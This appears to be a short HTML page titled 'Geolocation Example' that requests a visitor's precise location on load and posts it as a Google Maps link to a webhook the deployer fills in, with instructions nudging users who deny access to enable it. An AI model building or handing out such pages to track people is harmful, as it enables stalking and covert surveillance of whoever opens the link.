<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation Example</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #status {
            margin-top: 20px;
            font-size: 18px;
            color: #333;
        }
        #instructions {
            display: none;
            margin-top: 20px;
            font-size: 16px;
            color: #555;
        }
    </style>
</head>
<body>
    <h1>Geolocation Example</h1>
    <p id="status">Trying to access your location...</p>
    <p id="instructions">
        If you denied the request for location access, please enable it in your browser settings to send your location.
        <br><br>
        For iOS Safari: Go to <a href="https://support.apple.com/en-us/HT207056" target="_blank">Settings > Safari > Location</a> and select "Allow".
    </p>

    <script>
        function sendPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const webhookUrl = "https://your-webhook-url.com";  // เปลี่ยนเป็น URL ของ Webhook ของคุณ

            const data = {
                content: `Current location: https://www.google.com/maps?q=${latitude},${longitude}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                if (response.ok) {
                    document.getElementById('status').textContent = "Location sent successfully!";
                } else {
                    document.getElementById('status').textContent = "Failed to send location.";
                }
            }).catch(error => {
                document.getElementById('status').textContent = "Error: " + error;
            });
        }

        function showError(error) {
            let errorMessage = "An unknown error occurred.";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "User denied the request for Geolocation. Please enable location access in your browser settings.";
                    document.getElementById('instructions').style.display = 'block';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    errorMessage = "The request to get user location timed out.";
                    break;
            }
            document.getElementById('status').textContent = errorMessage;
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                    enableHighAccuracy: true
                });
            } else {
                document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
            }
        };
    </script>
</body>
</html>
